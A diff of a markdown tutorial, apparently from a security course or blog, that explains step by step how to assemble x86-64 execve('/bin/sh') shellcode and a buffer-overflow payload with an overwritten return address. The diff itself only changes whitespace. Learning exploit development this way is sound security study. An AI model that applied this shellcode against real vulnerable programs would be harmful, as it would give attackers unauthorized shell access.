@@ -14,60 +14,60 @@ To start, we first have to think about how we're able to run a process. When we 
 ### Arguments
 There is a list of syscalls each with ids. These ids will be very important and in fact will be one of the "arguments" we will be passing. The specific syscall we are interested in is called "execve". In summary, this syscall basically replaces the current running process with whatever you want, depending on the other arguments.  
 
-The second argument we want to pass is the path of the executable that the program will replace it with. In this case, it is /bin/sh.
-The third argument is a list of parameters including the path of the executable as the first list. More specifically, this will point to a list of string pointers of your arguments.
-The fourth argument is an optional argument where we use it to pass in any environment variables.
+The second argument we want to pass is the path of the executable that the program will replace it with. In this case, it is /bin/sh.  
+The third argument is a list of parameters including the path of the executable as the first list. More specifically, this will point to a list of string pointers of your arguments.  
+The fourth argument is an optional argument where we use it to pass in any environment variables.  
 ## Assembly Translation
 ### 1st step
-We first need to pass in the syscall id of 59 into our register rax. This is where you store your syscall ids if you want to call a specific one. The id of 59 belongs to the syscall execve. 
-Payload so far: 
-push $59
-pop %rax
-[ buffer bytes ]
-[ modified ret addr to instructions ]
-It is "good" practice to use push and pop to force constants into registers because using mov uses a lot more bytes than push/pop and also runs into the risk of allowing null bytes in your instruction set, which might indicate to programs that it is the end of your string, but luckily, not in this case.
+We first need to pass in the syscall id of 59 into our register rax. This is where you store your syscall ids if you want to call a specific one. The id of 59 belongs to the syscall execve.  
+Payload so far:  
+push $59  
+pop %rax  
+[ buffer bytes ]  
+[ modified ret addr to instructions ]  
+It is "good" practice to use push and pop to force constants into registers because using mov uses a lot more bytes than push/pop and also runs into the risk of allowing null bytes in your instruction set, which might indicate to programs that it is the end of your string, but luckily, not in this case.  
 
 ### 2nd step
-We then need to pass the pointer to our string of the path of our executable which is /bin/sh. We can store this somewhere in our buffer and pass in the pointer to the start of the string.
-Payload so far:
-push $59
-pop %rax
-push addr_to_/bin/sh
-pop %rdi
-[ /bin/sh somewhere + buffer bytes ]
-[modified ret addr to instructions ]
-### Third step
-Third step is we need to pass in a pointer to our list of pointers to our parameters. Since we don't have any parameters and just want to run /bin/sh, we can point to the pointer referencing /bin/sh and end it with a null value.
-Payload so far:
-push $59
-pop %rax
-push addr_to_/bin/sh
-pop %rdi
-push addr_to_pointer_to_/bin/sh
-pop %rsi
-[ /bin/sh somewhere + pointer to /bin/sh + 8 null bytes +  buffer bytes ]
-[modified ret addr to instructions ]
+We then need to pass the pointer to our string of the path of our executable which is /bin/sh. We can store this somewhere in our buffer and pass in the pointer to the start of the string.  
+Payload so far:  
+push $59  
+pop %rax  
+push addr_to_/bin/sh  
+pop %rdi  
+[ /bin/sh somewhere + buffer bytes ]  
+[modified ret addr to instructions ]  
+### Third step  
+Third step is we need to pass in a pointer to our list of pointers to our parameters. Since we don't have any parameters and just want to run /bin/sh, we can point to the pointer referencing /bin/sh and end it with a null value.  
+Payload so far:  
+push $59  
+pop %rax  
+push addr_to_/bin/sh  
+pop %rdi  
+push addr_to_pointer_to_/bin/sh  
+pop %rsi  
+[ /bin/sh somewhere + pointer to /bin/sh + 8 null bytes +  buffer bytes ]  
+[modified ret addr to instructions ]  
 ### Fourth step
-We can just pass a null value into our third parameter since we're not using it.
-Payload so far:
-push $59
-pop %rax
-push addr_to_/bin/sh
-pop %rdi
-push addr_to_pointer_to_/bin/sh
-pop %rsi
-xorq %rdx,%rdx
-[ /bin/sh somewhere + pointer to /bin/sh + 8 null bytes +  buffer bytes ]
-[modified ret addr to instructions ]
+We can just pass a null value into our third parameter since we're not using it.  
+Payload so far:  
+push $59  
+pop %rax  
+push addr_to_/bin/sh  
+pop %rdi  
+push addr_to_pointer_to_/bin/sh  
+pop %rsi  
+xorq %rdx,%rdx  
+[ /bin/sh somewhere + pointer to /bin/sh + 8 null bytes +  buffer bytes ]  
+[modified ret addr to instructions ]  
 ### Final step
-We can just finally call syscall in our final instruction.
-push $59
-pop %rax
-push addr_to_/bin/sh
-pop %rdi
-push addr_to_pointer_to_/bin/sh
-pop %rsi
-xorq %rdx,%rdx
-syscall
-[ /bin/sh somewhere + pointer to /bin/sh + 8 null bytes +  buffer bytes ]
+We can just finally call syscall in our final instruction.  
+push $59  
+pop %rax  
+push addr_to_/bin/sh  
+pop %rdi  
+push addr_to_pointer_to_/bin/sh  
+pop %rsi  
+xorq %rdx,%rdx  
+syscall  
+[ /bin/sh somewhere + pointer to /bin/sh + 8 null bytes +  buffer bytes ]  
 [modified ret addr to instructions ]
